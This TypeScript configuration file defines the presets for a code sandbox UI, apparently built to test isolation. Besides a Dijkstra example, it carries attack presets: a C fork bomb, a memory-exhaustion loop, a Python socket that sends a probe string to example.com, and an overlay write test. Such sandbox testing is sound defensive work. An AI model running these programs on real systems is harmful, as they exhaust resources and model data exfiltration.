export type LanguageKey = "cpp" | "c" | "python" | "javascript";

export interface LanguageOption {
  key: LanguageKey;
  label: string;
  filename: string;
  extension: string;
}

export interface SandboxLimits {
  memoryMb: number;
  cpuCores: number;
  maxPids: number;
  timeoutMs: number;
  strictSeccomp: boolean;
  enableNetwork: boolean;
}

export interface Preset {
  id: string;
  name: string;
  category: "normal" | "attack";
  language: LanguageKey;
  stdin: string;
  source: string;
  limits: SandboxLimits;
}

export const LANGUAGE_OPTIONS: LanguageOption[] = [
  { key: "cpp", label: "C++20", filename: "main.cpp", extension: ".cpp" },
  { key: "c", label: "C11", filename: "main.c", extension: ".c" },
  { key: "python", label: "Python 3", filename: "main.py", extension: ".py" },
  { key: "javascript", label: "Node.js", filename: "main.js", extension: ".js" },
];

export const EXTENSION_TO_LANGUAGE: Record<string, LanguageKey> = {
  ".cpp": "cpp",
  ".c": "c",
  ".py": "python",
  ".js": "javascript",
};

export const DEFAULT_LIMITS: SandboxLimits = {
  memoryMb: 128,
  cpuCores: 1,
  maxPids: 16,
  timeoutMs: 2000,
  strictSeccomp: true,
  enableNetwork: false,
};

export const STARTER_CODE: Record<LanguageKey, string> = {
  cpp: String.raw`#include <iostream>
#include <string>

int main() {
    std::string name;
    if (std::getline(std::cin, name)) {
        std::cout << "hello from the aegis sandbox, " << name << "\n";
    } else {
        std::cout << "hello from the aegis sandbox\n";
    }
    return 0;
}`,
  c: String.raw`#include <stdio.h>

int main(void) {
    char name[128];
    if (fgets(name, sizeof(name), stdin)) {
        printf("hello from the aegis sandbox, %s", name);
    } else {
        printf("hello from the aegis sandbox\n");
    }
    return 0;
}`,
  python: String.raw`import sys

name = sys.stdin.readline().strip()
if name:
    print(f"hello from the aegis sandbox, {name}")
else:
    print("hello from the aegis sandbox")`,
  javascript: String.raw`async function main() {
  const chunks = [];
  for await (const chunk of process.stdin) {
    chunks.push(chunk);
  }
  const name = Buffer.concat(chunks).toString().trim();
  if (name) {
    console.log("hello from the aegis sandbox, " + name);
  } else {
    console.log("hello from the aegis sandbox");
  }
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});`,
};

const DIJKSTRA_STDIN = `6 8
0 1 7
0 2 9
0 5 14
1 2 10
1 3 15
2 3 11
2 5 2
3 4 6
`;

const DIJKSTRA_SOURCE = String.raw`#include <bits/stdc++.h>
using namespace std;

int main() {
    ios::sync_with_stdio(false);
    cin.tie(nullptr);

    int n = 0;
    int m = 0;
    if (!(cin >> n >> m)) {
        return 0;
    }

    vector<vector<pair<int, long long>>> graph(n);
    for (int i = 0; i < m; ++i) {
        int u = 0;
        int v = 0;
        long long w = 0;
        cin >> u >> v >> w;
        graph[u].push_back({v, w});
        graph[v].push_back({u, w});
    }

    const long long inf = (1LL << 60);
    vector<long long> distance(n, inf);
    using Node = pair<long long, int>;
    priority_queue<Node, vector<Node>, greater<Node>> queue;
    distance[0] = 0;
    queue.push({0, 0});

    while (!queue.empty()) {
        auto [current_distance, u] = queue.top();
        queue.pop();
        if (current_distance != distance[u]) {
            continue;
        }
        for (auto [v, weight] : graph[u]) {
            if (distance[v] > current_distance + weight) {
                distance[v] = current_distance + weight;
                queue.push({distance[v], v});
            }
        }
    }

    for (int i = 0; i < n; ++i) {
        if (distance[i] == inf) {
            cout << i << " UNREACHABLE\n";
        } else {
            cout << i << " " << distance[i] << "\n";
        }
    }
    return 0;
}`;

const FORK_BOMB_SOURCE = String.raw`#include <unistd.h>

int main(void) {
    while (1) {
        fork();
    }
    return 0;
}`;

const OOM_SOURCE = String.raw`#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <vector>

int main() {
    std::vector<char*> blocks;
    constexpr std::size_t block_size = 8 * 1024 * 1024;
    for (;;) {
        char* block = static_cast<char*>(std::malloc(block_size));
        if (block == nullptr) {
            std::puts("allocation refused by the kernel");
            return 1;
        }
        std::memset(block, 0x41, block_size);
        blocks.push_back(block);
    }
}`;

const SOCKET_SOURCE = String.raw`import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(2.0)
try:
    sock.connect(("example.com", 443))
    sock.sendall(b"AEGIS_EXFIL_PROBE")
    print("unexpected network egress completed")
except OSError as error:
    print("network egress denied:", error)
finally:
    sock.close()`;

const OVERLAY_SOURCE = String.raw`import os

target = "/app/ephemeral_probe.txt"
with open(target, "w", encoding="utf-8") as handle:
    handle.write("aegis overlay probe\n")
with open(target, "a", encoding="utf-8") as handle:
    handle.write("second write inside the ram upperdir\n")

os.makedirs("/app/probe_dir", exist_ok=True)
with open("/app/probe_dir/nested.log", "w", encoding="utf-8") as handle:
    handle.write("nested artifact created after pivot_root\n")

print("wrote", target)
print("the ram upperdir is destroyed with the job cgroup")`;

export const PRESETS: Preset[] = [
  {
    id: "normal-dijkstra",
    name: "Normal: Dijkstra Shortest Path (C++20)",
    category: "normal",
    language: "cpp",
    stdin: DIJKSTRA_STDIN,
    source: DIJKSTRA_SOURCE,
    limits: {
      memoryMb: 64,
      cpuCores: 1,
      maxPids: 16,
      timeoutMs: 3000,
      strictSeccomp: true,
      enableNetwork: false,
    },
  },
  {
    id: "attack-fork-bomb",
    name: "Attack: Fork Bomb Process Exhaustion (C)",
    category: "attack",
    language: "c",
    stdin: "",
    source: FORK_BOMB_SOURCE,
    limits: {
      memoryMb: 32,
      cpuCores: 0.5,
      maxPids: 16,
      timeoutMs: 800,
      strictSeccomp: true,
      enableNetwork: false,
    },
  },
  {
    id: "attack-oom-allocation",
    name: "Attack: 256MB OOM Allocation Spike (C++)",
    category: "attack",
    language: "cpp",
    stdin: "",
    source: OOM_SOURCE,
    limits: {
      memoryMb: 64,
      cpuCores: 1,
      maxPids: 16,
      timeoutMs: 4000,
      strictSeccomp: true,
      enableNetwork: false,
    },
  },
  {
    id: "attack-socket-exfiltration",
    name: "Attack: Unauthorized Socket Exfiltration (Python)",
    category: "attack",
    language: "python",
    stdin: "",
    source: SOCKET_SOURCE,
    limits: {
      memoryMb: 64,
      cpuCores: 0.5,
      maxPids: 16,
      timeoutMs: 2000,
      strictSeccomp: true,
      enableNetwork: false,
    },
  },
  {
    id: "attack-overlayfs-write",
    name: "Attack: Ephemeral OverlayFS Write & Wipe Test (Python)",
    category: "attack",
    language: "python",
    stdin: "",
    source: OVERLAY_SOURCE,
    limits: {
      memoryMb: 64,
      cpuCores: 0.5,
      maxPids: 16,
      timeoutMs: 3000,
      strictSeccomp: true,
      enableNetwork: false,
    },
  },
];
